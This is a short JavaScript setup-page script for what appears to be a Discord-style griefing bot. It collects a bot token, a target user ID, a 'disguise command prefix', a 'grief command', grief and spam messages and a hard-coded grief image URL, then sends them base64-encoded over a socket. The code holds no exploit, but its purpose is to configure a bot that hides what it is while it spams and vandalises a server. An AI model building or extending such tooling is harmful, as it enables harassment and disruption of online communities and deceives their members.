window.onload = function () {

    document.getElementById("submitBtn").addEventListener("click", () => {
        let botToken = document.getElementById("botToken").value;
        let userID = document.getElementById("userID").value;
        let activityDescription = document.getElementById("activityDescription").value;
        let disguiseCommandPrefix = document.getElementById("disguiseCommandPrefix").value;
        let griefCommand = document.getElementById("griefCommand").value;
        let griefMessage = document.getElementById("griefMessage").value;
        let spamMessage = document.getElementById("spamMessage").value;
        const griefPicture = "https://0cn.de/po21";

        if (botToken != "" && userID != "") {
            activityDescription = (activityDescription == "") ? document.getElementById("activityDescription").placeholder : activityDescription;
            disguiseCommandPrefix = (disguiseCommandPrefix == "") ? document.getElementById("disguiseCommandPrefix").placeholder : disguiseCommandPrefix;
            griefCommand = (griefCommand == "") ? document.getElementById("griefCommand").placeholder : griefCommand;
            griefMessage = (griefMessage == "") ? document.getElementById("griefMessage").placeholder : griefMessage;
            spamMessage = (spamMessage == "") ? document.getElementById("spamMessage").placeholder : spamMessage;

            const jsonObj = { botToken: botToken, userID: userID, activityDescription: activityDescription, disguiseCommandPrefix: disguiseCommandPrefix, griefCommand: griefCommand, griefMessage: griefMessage, spamMessage: spamMessage, griefPicture: griefPicture };
            socket.send("SETUP|" + btoa(JSON.stringify(jsonObj)));
        }
        location.reload();
    });

}